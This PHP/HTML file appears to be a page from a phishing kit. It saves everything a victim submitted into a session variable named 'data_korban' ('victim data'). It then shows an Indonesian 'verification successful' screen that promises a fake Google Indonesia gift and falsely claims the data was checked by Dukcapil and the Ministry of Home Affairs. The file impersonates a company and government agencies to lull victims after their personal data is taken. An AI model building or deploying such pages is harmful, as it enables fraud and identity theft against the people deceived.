<?php
session_start();
$_SESSION['data_korban'] = $_POST;
?>
<!DOCTYPE html>
<html>
<head>
    <title>Verifikasi Berhasil!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* CSS Responsive */
        * {
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Google Sans', Arial;
            text-align: center;
            padding: 20px;
            background: #f8f9fa;
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .success-box {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 600px;
            width: 95%;
            margin: 0 auto;
        }
        
        .gift-icon {
            width: 80px;
            max-width: 30vw;
            margin-bottom: 15px;
        }

        h2 {
            font-size: 1.5rem;
            margin: 15px 0;
            color: #202124;
        }

        p {
            color: #5f6368;
            line-height: 1.5;
            font-size: 0.9rem;
            margin: 15px 0;
        }

        .highlight {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            font-size: 0.95rem;
        }

        .disclaimer {
            font-size: 0.75rem;
            color: #5f6368;
            margin-top: 20px;
        }

        @media (max-width: 480px) {
            .success-box {
                padding: 20px;
            }
            
            h2 {
                font-size: 1.3rem;
            }
            
            .gift-icon {
                width: 60px;
            }
            
            .highlight {
                padding: 10px;
                font-size: 0.85rem;
            }
        }
    </style>
</head>
<body>
    <div class="success-box">
        <img src="https://www.freeiconspng.com/uploads/gift-box-icon-4.png" class="gift-icon" alt="Hadiah">
        <h2>🎉 Verifikasi Berhasil!</h2>
        
        <div class="highlight">
            <p>Terima kasih telah melengkapi data verifikasi.<br>
            Hadiah eksklusif Google Indonesia akan dikirimkan dalam 7 hari kerja:</p>
            <p>📅 Estimasi Pengiriman:<br><?= date('d M Y', strtotime('+7 days')) ?></p>
        </div>

        <p class="disclaimer">
            *Data telah diverifikasi melalui sistem Dukcapil dan Kementerian Dalam Negeri
        </p>
    </div>
</body>
</html>